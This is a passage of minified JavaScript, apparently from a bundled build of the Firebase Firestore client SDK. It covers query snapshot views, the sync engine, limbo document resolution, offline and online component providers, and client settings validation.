i=n.getNext().key,s=r.getNext().key;if(!i.isEqual(s))return!1}return!0}toString(){const e=[];return this.forEach((n=>{e.push(n.toString())})),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,n){const r=new p1;return r.comparator=this.comparator,r.keyedMap=e,r.sortedSet=n,r}}class Qne{constructor(){this.ga=new Yr(Pt.comparator)}track(e){const n=e.doc.key,r=this.ga.get(n);r?e.type!==0&&r.type===3?this.ga=this.ga.insert(n,e):e.type===3&&r.type!==1?this.ga=this.ga.insert(n,{type:r.type,doc:e.doc}):e.type===2&&r.type===2?this.ga=this.ga.insert(n,{type:2,doc:e.doc}):e.type===2&&r.type===0?this.ga=this.ga.insert(n,{type:0,doc:e.doc}):e.type===1&&r.type===0?this.ga=this.ga.remove(n):e.type===1&&r.type===2?this.ga=this.ga.insert(n,{type:1,doc:r.doc}):e.type===0&&r.type===1?this.ga=this.ga.insert(n,{type:2,doc:e.doc}):Ft(63341,{Rt:e,pa:r}):this.ga=this.ga.insert(n,e)}ya(){const e=[];return this.ga.inorderTraversal(((n,r)=>{e.push(r)})),e}}class ew{constructor(e,n,r,i,s,o,a,c,l){this.query=e,this.docs=n,this.oldDocs=r,this.docChanges=i,this.mutatedKeys=s,this.fromCache=o,this.syncStateChanged=a,this.excludesMetadataChanges=c,this.hasCachedResults=l}static fromInitialDocuments(e,n,r,i,s){const o=[];return n.forEach((a=>{o.push({type:0,doc:a})})),new ew(e,n,p1.emptySet(n),o,r,i,!0,!1,s)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&mR(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const n=this.docChanges,r=e.docChanges;if(n.length!==r.length)return!1;for(let i=0;i<n.length;i++)if(n[i].type!==r[i].type||!n[i].doc.isEqual(r[i].doc))return!1;return!0}}class bGe{constructor(){this.wa=void 0,this.Sa=[]}ba(){return this.Sa.some((e=>e.Da()))}}class wGe{constructor(){this.queries=Jne(),this.onlineState="Unknown",this.Ca=new Set}terminate(){(function(n,r){const i=Gt(n),s=i.queries;i.queries=Jne(),s.forEach(((o,a)=>{for(const c of a.Sa)c.onError(r)}))})(this,new ut(Fe.ABORTED,"Firestore shutting down"))}}function Jne(){return new hy((t=>wfe(t)),mR)}async function ehe(t,e){const n=Gt(t);let r=3;const i=e.query;let s=n.queries.get(i);s?!s.ba()&&e.Da()&&(r=2):(s=new bGe,r=e.Da()?0:1);try{switch(r){case 0:s.wa=await n.onListen(i,!0);break;case 1:s.wa=await n.onListen(i,!1);break;case 2:await n.onFirstRemoteStoreListen(i)}}catch(o){const a=oU(o,`Initialization of query '${Lb(e.query)}' failed`);return void e.onError(a)}n.queries.set(i,s),s.Sa.push(e),e.va(n.onlineState),s.wa&&e.Fa(s.wa)&&aU(n)}async function the(t,e){const n=Gt(t),r=e.query;let i=3;const s=n.queries.get(r);if(s){const o=s.Sa.indexOf(e);o>=0&&(s.Sa.splice(o,1),s.Sa.length===0?i=e.Da()?0:1:!s.ba()&&e.Da()&&(i=2))}switch(i){case 0:return n.queries.delete(r),n.onUnlisten(r,!0);case 1:return n.queries.delete(r),n.onUnlisten(r,!1);case 2:return n.onLastRemoteStoreUnlisten(r);default:return}}function vGe(t,e){const n=Gt(t);let r=!1;for(const i of e){const s=i.query,o=n.queries.get(s);if(o){for(const a of o.Sa)a.Fa(i)&&(r=!0);o.wa=i}}r&&aU(n)}function EGe(t,e,n){const r=Gt(t),i=r.queries.get(e);if(i)for(const s of i.Sa)s.onError(n);r.queries.delete(e)}function aU(t){t.Ca.forEach((e=>{e.next()}))}var WD,Xne;(Xne=WD||(WD={})).Ma="default",Xne.Cache="cache";class nhe{constructor(e,n,r){this.query=e,this.xa=n,this.Oa=!1,this.Na=null,this.onlineState="Unknown",this.options=r||{}}Fa(e){if(!this.options.includeMetadataChanges){const r=[];for(const i of e.docChanges)i.type!==3&&r.push(i);e=new ew(e.query,e.docs,e.oldDocs,r,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let n=!1;return this.Oa?this.Ba(e)&&(this.xa.next(e),n=!0):this.La(e,this.onlineState)&&(this.ka(e),n=!0),this.Na=e,n}onError(e){this.xa.error(e)}va(e){this.onlineState=e;let n=!1;return this.Na&&!this.Oa&&this.La(this.Na,e)&&(this.ka(this.Na),n=!0),n}La(e,n){if(!e.fromCache||!this.Da())return!0;const r=n!=="Offline";return(!this.options.qa||!r)&&(!e.docs.isEmpty()||e.hasCachedResults||n==="Offline")}Ba(e){if(e.docChanges.length>0)return!0;const n=this.Na&&this.Na.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!n)&&this.options.includeMetadataChanges===!0}ka(e){e=ew.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.Oa=!0,this.xa.next(e)}Da(){return this.options.source!==WD.Cache}}class rhe{constructor(e){this.key=e}}class ihe{constructor(e){this.key=e}}class _Ge{constructor(e,n){this.query=e,this.Ya=n,this.Za=null,this.hasCachedResults=!1,this.current=!1,this.Xa=mn(),this.mutatedKeys=mn(),this.eu=vfe(e),this.tu=new p1(this.eu)}get nu(){return this.Ya}ru(e,n){const r=n?n.iu:new Qne,i=n?n.tu:this.tu;let s=n?n.mutatedKeys:this.mutatedKeys,o=i,a=!1;const c=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,l=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal(((f,h)=>{const m=i.get(f),b=gR(this.query,h)?h:null,w=!!m&&this.mutatedKeys.has(m.key),y=!!b&&(b.hasLocalMutations||this.mutatedKeys.has(b.key)&&b.hasCommittedMutations);let E=!1;m&&b?m.data.isEqual(b.data)?w!==y&&(r.track({type:3,doc:b}),E=!0):this.su(m,b)||(r.track({type:2,doc:b}),E=!0,(c&&this.eu(b,c)>0||l&&this.eu(b,l)<0)&&(a=!0)):!m&&b?(r.track({type:0,doc:b}),E=!0):m&&!b&&(r.track({type:1,doc:m}),E=!0,(c||l)&&(a=!0)),E&&(b?(o=o.add(b),s=y?s.add(f):s.delete(f)):(o=o.delete(f),s=s.delete(f)))})),this.query.limit!==null)for(;o.size>this.query.limit;){const f=this.query.limitType==="F"?o.last():o.first();o=o.delete(f.key),s=s.delete(f.key),r.track({type:1,doc:f})}return{tu:o,iu:r,Cs:a,mutatedKeys:s}}su(e,n){return e.hasLocalMutations&&n.hasCommittedMutations&&!n.hasLocalMutations}applyChanges(e,n,r,i){const s=this.tu;this.tu=e.tu,this.mutatedKeys=e.mutatedKeys;const o=e.iu.ya();o.sort(((f,h)=>(function(b,w){const y=E=>{switch(E){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return Ft(20277,{Rt:E})}};return y(b)-y(w)})(f.type,h.type)||this.eu(f.doc,h.doc))),this.ou(r),i=i??!1;const a=n&&!i?this._u():[],c=this.Xa.size===0&&this.current&&!i?1:0,l=c!==this.Za;return this.Za=c,o.length!==0||l?{snapshot:new ew(this.query,e.tu,s,o,e.mutatedKeys,c===0,l,!1,!!r&&r.resumeToken.approximateByteSize()>0),au:a}:{au:a}}va(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({tu:this.tu,iu:new Qne,mutatedKeys:this.mutatedKeys,Cs:!1},!1)):{au:[]}}uu(e){return!this.Ya.has(e)&&!!this.tu.has(e)&&!this.tu.get(e).hasLocalMutations}ou(e){e&&(e.addedDocuments.forEach((n=>this.Ya=this.Ya.add(n))),e.modifiedDocuments.forEach((n=>{})),e.removedDocuments.forEach((n=>this.Ya=this.Ya.delete(n))),this.current=e.current)}_u(){if(!this.current)return[];const e=this.Xa;this.Xa=mn(),this.tu.forEach((r=>{this.uu(r.key)&&(this.Xa=this.Xa.add(r.key))}));const n=[];return e.forEach((r=>{this.Xa.has(r)||n.push(new ihe(r))})),this.Xa.forEach((r=>{e.has(r)||n.push(new rhe(r))})),n}cu(e){this.Ya=e.Qs,this.Xa=mn();const n=this.ru(e.documents);return this.applyChanges(n,!0)}lu(){return ew.fromInitialDocuments(this.query,this.tu,this.mutatedKeys,this.Za===0,this.hasCachedResults)}}const cU="SyncEngine";class AGe{constructor(e,n,r){this.query=e,this.targetId=n,this.view=r}}class CGe{constructor(e){this.key=e,this.hu=!1}}class SGe{constructor(e,n,r,i,s,o){this.localStore=e,this.remoteStore=n,this.eventManager=r,this.sharedClientState=i,this.currentUser=s,this.maxConcurrentLimboResolutions=o,this.Pu={},this.Tu=new hy((a=>wfe(a)),mR),this.Iu=new Map,this.Eu=new Set,this.du=new Yr(Pt.comparator),this.Au=new Map,this.Ru=new QM,this.Vu={},this.mu=new Map,this.fu=X1.cr(),this.onlineState="Unknown",this.gu=void 0}get isPrimaryClient(){return this.gu===!0}}async function TGe(t,e,n=!0){const r=lhe(t);let i;const s=r.Tu.get(e);return s?(r.sharedClientState.addLocalQueryTarget(s.targetId),i=s.view.lu()):i=await she(r,e,n,!0),i}async function xGe(t,e){const n=lhe(t);await she(n,e,!0,!1)}async function she(t,e,n,r){const i=await GWe(t.localStore,zl(e)),s=i.targetId,o=t.sharedClientState.addLocalQueryTarget(s,n);let a;return r&&(a=await IGe(t,e,s,o==="current",i.resumeToken)),t.isPrimaryClient&&n&&Kfe(t.remoteStore,i),a}async function IGe(t,e,n,r,i){t.pu=(h,m,b)=>(async function(y,E,A,R){let S=E.view.ru(A);S.Cs&&(S=await Vne(y.localStore,E.query,!1).then((({documents:_})=>E.view.ru(_,S))));const v=R&&R.targetChanges.get(E.targetId),k=R&&R.targetMismatches.get(E.targetId)!=null,O=E.view.applyChanges(S,y.isPrimaryClient,v,k);return tre(y,E.targetId,O.au),O.snapshot})(t,h,m,b);const s=await Vne(t.localStore,e,!0),o=new _Ge(e,s.Qs),a=o.ru(s.documents),c=o5.createSynthesizedTargetChangeForCurrentChange(n,r&&t.onlineState!=="Offline",i),l=o.applyChanges(a,t.isPrimaryClient,c);tre(t,n,l.au);const f=new AGe(e,n,o);return t.Tu.set(e,f),t.Iu.has(n)?t.Iu.get(n).push(e):t.Iu.set(n,[e]),l.snapshot}async function RGe(t,e,n){const r=Gt(t),i=r.Tu.get(e),s=r.Iu.get(i.targetId);if(s.length>1)return r.Iu.set(i.targetId,s.filter((o=>!mR(o,e)))),void r.Tu.delete(e);r.isPrimaryClient?(r.sharedClientState.removeLocalQueryTarget(i.targetId),r.sharedClientState.isActiveQueryTarget(i.targetId)||await qD(r.localStore,i.targetId,!1).then((()=>{r.sharedClientState.clearQueryState(i.targetId),n&&tU(r.remoteStore,i.targetId),GD(r,i.targetId)})).catch(Aw)):(GD(r,i.targetId),await qD(r.localStore,i.targetId,!0))}async function PGe(t,e){const n=Gt(t),r=n.Tu.get(e),i=n.Iu.get(r.targetId);n.isPrimaryClient&&i.length===1&&(n.sharedClientState.removeLocalQueryTarget(r.targetId),tU(n.remoteStore,r.targetId))}async function NGe(t,e,n){const r=UGe(t);try{const i=await(function(o,a){const c=Gt(o),l=kr.now(),f=a.reduce(((b,w)=>b.add(w.key)),mn());let h,m;return c.persistence.runTransaction("Locally write mutations","readwrite",(b=>{let w=qf(),y=mn();return c.Ns.getEntries(b,f).next((E=>{w=E,w.forEach(((A,R)=>{R.isValidDocument()||(y=y.add(A))}))})).next((()=>c.localDocuments.getOverlayedDocuments(b,w))).next((E=>{h=E;const A=[];for(const R of a){const S=WVe(R,h.get(R.key).overlayedDocument);S!=null&&A.push(new py(R.key,S,dfe(S.value.mapValue),xf.exists(!0)))}return c.mutationQueue.addMutationBatch(b,l,A,a)})).next((E=>{m=E;const A=E.applyToLocalDocumentSet(h,y);return c.documentOverlayCache.saveOverlays(b,E.batchId,A)}))})).then((()=>({batchId:m.batchId,changes:_fe(h)})))})(r.localStore,e);r.sharedClientState.addPendingMutation(i.batchId),(function(o,a,c){let l=o.Vu[o.currentUser.toKey()];l||(l=new Yr(pn)),l=l.insert(a,c),o.Vu[o.currentUser.toKey()]=l})(r,i.batchId,n),await c5(r,i.changes),await _R(r.remoteStore)}catch(i){const s=oU(i,"Failed to persist write");n.reject(s)}}async function ohe(t,e){const n=Gt(t);try{const r=await qWe(n.localStore,e);e.targetChanges.forEach(((i,s)=>{const o=n.Au.get(s);o&&(Kn(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1,22616),i.addedDocuments.size>0?o.hu=!0:i.modifiedDocuments.size>0?Kn(o.hu,14607):i.removedDocuments.size>0&&(Kn(o.hu,42227),o.hu=!1))})),await c5(n,r,e)}catch(r){await Aw(r)}}function ere(t,e,n){const r=Gt(t);if(r.isPrimaryClient&&n===0||!r.isPrimaryClient&&n===1){const i=[];r.Tu.forEach(((s,o)=>{const a=o.view.va(e);a.snapshot&&i.push(a.snapshot)})),(function(o,a){const c=Gt(o);c.onlineState=a;let l=!1;c.queries.forEach(((f,h)=>{for(const m of h.Sa)m.va(a)&&(l=!0)})),l&&aU(c)})(r.eventManager,e),i.length&&r.Pu.H_(i),r.onlineState=e,r.isPrimaryClient&&r.sharedClientState.setOnlineState(e)}}async function OGe(t,e,n){const r=Gt(t);r.sharedClientState.updateQueryState(e,"rejected",n);const i=r.Au.get(e),s=i&&i.key;if(s){let o=new Yr(Pt.comparator);o=o.insert(s,Gs.newNoDocument(s,qt.min()));const a=mn().add(s),c=new wR(qt.min(),new Map,new Yr(pn),o,a);await ohe(r,c),r.du=r.du.remove(s),r.Au.delete(e),uU(r)}else await qD(r.localStore,e,!1).then((()=>GD(r,e,n))).catch(Aw)}async function kGe(t,e){const n=Gt(t),r=e.batch.batchId;try{const i=await zWe(n.localStore,e);che(n,r,null),ahe(n,r),n.sharedClientState.updateMutationState(r,"acknowledged"),await c5(n,i)}catch(i){await Aw(i)}}async function DGe(t,e,n){const r=Gt(t);try{const i=await(function(o,a){const c=Gt(o);return c.persistence.runTransaction("Reject batch","readwrite-primary",(l=>{let f;return c.mutationQueue.lookupMutationBatch(l,a).next((h=>(Kn(h!==null,37113),f=h.keys(),c.mutationQueue.removeMutationBatch(l,h)))).next((()=>c.mutationQueue.performConsistencyCheck(l))).next((()=>c.documentOverlayCache.removeOverlaysForBatchId(l,f,a))).next((()=>c.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(l,f))).next((()=>c.localDocuments.getDocuments(l,f)))}))})(r.localStore,e);che(r,e,n),ahe(r,e),r.sharedClientState.updateMutationState(e,"rejected",n),await c5(r,i)}catch(i){await Aw(i)}}function ahe(t,e){(t.mu.get(e)||[]).forEach((n=>{n.resolve()})),t.mu.delete(e)}function che(t,e,n){const r=Gt(t);let i=r.Vu[r.currentUser.toKey()];if(i){const s=i.get(e);s&&(n?s.reject(n):s.resolve(),i=i.remove(e)),r.Vu[r.currentUser.toKey()]=i}}function GD(t,e,n=null){t.sharedClientState.removeLocalQueryTarget(e);for(const r of t.Iu.get(e))t.Tu.delete(r),n&&t.Pu.yu(r,n);t.Iu.delete(e),t.isPrimaryClient&&t.Ru.jr(e).forEach((r=>{t.Ru.containsKey(r)||uhe(t,r)}))}function uhe(t,e){t.Eu.delete(e.path.canonicalString());const n=t.du.get(e);n!==null&&(tU(t.remoteStore,n),t.du=t.du.remove(e),t.Au.delete(n),uU(t))}function tre(t,e,n){for(const r of n)r instanceof rhe?(t.Ru.addReference(r.key,e),BGe(t,r)):r instanceof ihe?(mt(cU,"Document no longer in limbo: "+r.key),t.Ru.removeReference(r.key,e),t.Ru.containsKey(r.key)||uhe(t,r.key)):Ft(19791,{wu:r})}function BGe(t,e){const n=e.key,r=n.path.canonicalString();t.du.get(n)||t.Eu.has(r)||(mt(cU,"New document in limbo: "+n),t.Eu.add(r),uU(t))}function uU(t){for(;t.Eu.size>0&&t.du.size<t.maxConcurrentLimboResolutions;){const e=t.Eu.values().next().value;t.Eu.delete(e);const n=new Pt(Sr.fromString(e)),r=t.fu.next();t.Au.set(r,new CGe(n)),t.du=t.du.insert(n,r),Kfe(t.remoteStore,new yp(zl(pR(n.path)),r,"TargetPurposeLimboResolution",dR.ce))}}async function c5(t,e,n){const r=Gt(t),i=[],s=[],o=[];r.Tu.isEmpty()||(r.Tu.forEach(((a,c)=>{o.push(r.pu(c,e,n).then((l=>{if((l||n)&&r.isPrimaryClient){const f=l?!l.fromCache:n?.targetChanges.get(c.targetId)?.current;r.sharedClientState.updateQueryState(c.targetId,f?"current":"not-current")}if(l){i.push(l);const f=XM.As(c.targetId,l);s.push(f)}})))})),await Promise.all(o),r.Pu.H_(i),await(async function(c,l){const f=Gt(c);try{await f.persistence.runTransaction("notifyLocalViewChanges","readwrite",(h=>He.forEach(l,(m=>He.forEach(m.Es,(b=>f.persistence.referenceDelegate.addReference(h,m.targetId,b))).next((()=>He.forEach(m.ds,(b=>f.persistence.referenceDelegate.removeReference(h,m.targetId,b)))))))))}catch(h){if(!Cw(h))throw h;mt(eU,"Failed to update sequence numbers: "+h)}for(const h of l){const m=h.targetId;if(!h.fromCache){const b=f.Ms.get(m),w=b.snapshotVersion,y=b.withLastLimboFreeSnapshotVersion(w);f.Ms=f.Ms.insert(m,y)}}})(r.localStore,s))}async function jGe(t,e){const n=Gt(t);if(!n.currentUser.isEqual(e)){mt(cU,"User change. New user:",e.toKey());const r=await qfe(n.localStore,e);n.currentUser=e,(function(s,o){s.mu.forEach((a=>{a.forEach((c=>{c.reject(new ut(Fe.CANCELLED,o))}))})),s.mu.clear()})(n,"'waitForPendingWrites' promise is rejected due to a user change."),n.sharedClientState.handleUserChange(e,r.removedBatchIds,r.addedBatchIds),await c5(n,r.Ls)}}function MGe(t,e){const n=Gt(t),r=n.Au.get(e);if(r&&r.hu)return mn().add(r.key);{let i=mn();const s=n.Iu.get(e);if(!s)return i;for(const o of s){const a=n.Tu.get(o);i=i.unionWith(a.view.nu)}return i}}function lhe(t){const e=Gt(t);return e.remoteStore.remoteSyncer.applyRemoteEvent=ohe.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=MGe.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=OGe.bind(null,e),e.Pu.H_=vGe.bind(null,e.eventManager),e.Pu.yu=EGe.bind(null,e.eventManager),e}function UGe(t){const e=Gt(t);return e.remoteStore.remoteSyncer.applySuccessfulWrite=kGe.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=DGe.bind(null,e),e}class kI{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=vR(e.databaseInfo.databaseId),this.sharedClientState=this.Du(e),this.persistence=this.Cu(e),await this.persistence.start(),this.localStore=this.vu(e),this.gcScheduler=this.Fu(e,this.localStore),this.indexBackfillerScheduler=this.Mu(e,this.localStore)}Fu(e,n){return null}Mu(e,n){return null}vu(e){return HWe(this.persistence,new LWe,e.initialUser,this.serializer)}Cu(e){return new zfe(JM.mi,this.serializer)}Du(e){return new ZWe}async terminate(){this.gcScheduler?.stop(),this.indexBackfillerScheduler?.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}kI.provider={build:()=>new kI};class LGe extends kI{constructor(e){super(),this.cacheSizeBytes=e}Fu(e,n){Kn(this.persistence.referenceDelegate instanceof NI,46915);const r=this.persistence.referenceDelegate.garbageCollector;return new CWe(r,e.asyncQueue,n)}Cu(e){const n=this.cacheSizeBytes!==void 0?Go.withCacheSize(this.cacheSizeBytes):Go.DEFAULT;return new zfe((r=>NI.mi(r,n)),this.serializer)}}class KD{async initialize(e,n){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(n),this.remoteStore=this.createRemoteStore(n),this.eventManager=this.createEventManager(n),this.syncEngine=this.createSyncEngine(n,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=r=>ere(this.syncEngine,r,1),this.remoteStore.remoteSyncer.handleCredentialChange=jGe.bind(null,this.syncEngine),await yGe(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return(function(){return new wGe})()}createDatastore(e){const n=vR(e.databaseInfo.databaseId),r=(function(s){return new eGe(s)})(e.databaseInfo);return(function(s,o,a,c){return new iGe(s,o,a,c)})(e.authCredentials,e.appCheckCredentials,r,n)}createRemoteStore(e){return(function(r,i,s,o,a){return new oGe(r,i,s,o,a)})(this.localStore,this.datastore,e.asyncQueue,(n=>ere(this.syncEngine,n,0)),(function(){return Kne.v()?new Kne:new YWe})())}createSyncEngine(e,n){return(function(i,s,o,a,c,l,f){const h=new SGe(i,s,o,a,c,l);return f&&(h.gu=!0),h})(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,n)}async terminate(){await(async function(n){const r=Gt(n);mt(Bg,"RemoteStore shutting down."),r.Ea.add(5),await a5(r),r.Aa.shutdown(),r.Ra.set("Unknown")})(this.remoteStore),this.datastore?.terminate(),this.eventManager?.terminate()}}KD.provider={build:()=>new KD};class dhe{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.Ou(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.Ou(this.observer.error,e):zf("Uncaught Error in snapshot listener:",e.toString()))}Nu(){this.muted=!0}Ou(e,n){setTimeout((()=>{this.muted||e(n)}),0)}}const Vp="FirestoreClient";class FGe{constructor(e,n,r,i,s){this.authCredentials=e,this.appCheckCredentials=n,this.asyncQueue=r,this.databaseInfo=i,this.user=Ws.UNAUTHENTICATED,this.clientId=$M.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=s,this.authCredentials.start(r,(async o=>{mt(Vp,"Received user=",o.uid),await this.authCredentialListener(o),this.user=o})),this.appCheckCredentials.start(r,(o=>(mt(Vp,"Received new app check token=",o),this.appCheckCredentialListener(o,this.user))))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new Cp;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted((async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(n){const r=oU(n,"Failed to shutdown persistence");e.reject(r)}})),e.promise}}async function Ck(t,e){t.asyncQueue.verifyOperationInProgress(),mt(Vp,"Initializing OfflineComponentProvider");const n=t.configuration;await e.initialize(n);let r=n.initialUser;t.setCredentialChangeListener((async i=>{r.isEqual(i)||(await qfe(e.localStore,i),r=i)})),e.persistence.setDatabaseDeletedListener((()=>t.terminate())),t._offlineComponents=e}async function nre(t,e){t.asyncQueue.verifyOperationInProgress();const n=await $Ge(t);mt(Vp,"Initializing OnlineComponentProvider"),await e.initialize(n,t.configuration),t.setCredentialChangeListener((r=>Yne(e.remoteStore,r))),t.setAppCheckTokenChangeListener(((r,i)=>Yne(e.remoteStore,i))),t._onlineComponents=e}async function $Ge(t){if(!t._offlineComponents)if(t._uninitializedComponentsProvider){mt(Vp,"Using user provided OfflineComponentProvider");try{await Ck(t,t._uninitializedComponentsProvider._offline)}catch(e){const n=e;if(!(function(i){return i.name==="FirebaseError"?i.code===Fe.FAILED_PRECONDITION||i.code===Fe.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11})(n))throw n;Z1("Error using user provided cache. Falling back to memory cache: "+n),await Ck(t,new kI)}}else mt(Vp,"Using default OfflineComponentProvider"),await Ck(t,new LGe(void 0));return t._offlineComponents}async function fhe(t){return t._onlineComponents||(t._uninitializedComponentsProvider?(mt(Vp,"Using user provided OnlineComponentProvider"),await nre(t,t._uninitializedComponentsProvider._online)):(mt(Vp,"Using default OnlineComponentProvider"),await nre(t,new KD))),t._onlineComponents}function HGe(t){return fhe(t).then((e=>e.syncEngine))}async function ZD(t){const e=await fhe(t),n=e.eventManager;return n.onListen=TGe.bind(null,e.syncEngine),n.onUnlisten=RGe.bind(null,e.syncEngine),n.onFirstRemoteStoreListen=xGe.bind(null,e.syncEngine),n.onLastRemoteStoreUnlisten=PGe.bind(null,e.syncEngine),n}function zGe(t,e,n={}){const r=new Cp;return t.asyncQueue.enqueueAndForget((async()=>(function(s,o,a,c,l){const f=new dhe({next:m=>{f.Nu(),o.enqueueAndForget((()=>the(s,h)));const b=m.docs.has(a);!b&&m.fromCache?l.reject(new ut(Fe.UNAVAILABLE,"Failed to get document because the client is offline.")):b&&m.fromCache&&c&&c.source==="server"?l.reject(new ut(Fe.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):l.resolve(m)},error:m=>l.reject(m)}),h=new nhe(pR(a.path),f,{includeMetadataChanges:!0,qa:!0});return ehe(s,h)})(await ZD(t),t.asyncQueue,e,n,r))),r.promise}function hhe(t){const e={};return t.timeoutSeconds!==void 0&&(e.timeoutSeconds=t.timeoutSeconds),e}const rre=new Map;const phe="firestore.googleapis.com",ire=!0;class sre{constructor(e){if(e.host===void 0){if(e.ssl!==void 0)throw new ut(Fe.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=phe,this.ssl=ire}else this.host=e.host,this.ssl=e.ssl??ire;if(this.isUsingEmulator=e.emulatorOptions!==void 0,this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=Hfe;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<_We)throw new ut(Fe.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}oVe("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=hhe(e.experimentalLongPollingOptions??{}),(function(r){if(r.timeoutSeconds!==void 0){if(isNaN(r.timeoutSeconds))throw new ut(Fe.INVALID_ARGUMENT,`invalid long polling timeout: ${r.timeoutSeconds} (must not be NaN)`);if(r.timeoutSeconds<5)throw new ut(Fe.INVALID_ARGUMENT,`invalid long polling timeout: ${r.timeoutSeconds} (minimum allowed value is 5)`);if(r.timeoutSeconds>30)throw new ut(Fe.INVALID_ARGUMENT,`invalid long polling timeout: ${r.timeoutSeconds} (maximum allowed value is 30)`)}})(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&(function(r,i){return r.timeoutSeconds===i.timeoutSeconds})(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class AR{constructor(e,n,r,i){this._authCredentials=e,this._appCheckCredentials=n,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new sre({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new ut(Fe.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new ut(Fe.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new sre(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=(function(r){if(!r)return new Yqe;switch(r.type){case"firstParty":return new eVe(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new ut(Fe.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}})(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return(function(n){const r=rre.get(n);r&&(mt("ComponentProvider","Removing Datastore"),rre.delete(n),r.terminate())})(this),Promise.resolve()}}function qGe(t,e,n,r={}){t=Sp(t,AR);const i=UM(e),s=t._getSettings(),o={...s,emulatorOptions:t._getEmulatorOptions()},a=`${e}:${n}`;i&&(Sze(`https://${a}`),Rze("Firestore",!0)),s.host!==phe&&s.host!==a&&Z1("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const c={...s,host:a,ssl:i,emulatorOptions:r};if(!vI(c,o)&&(t._setSettings(c),r.mockUserToken)){let l,f;if(typeof 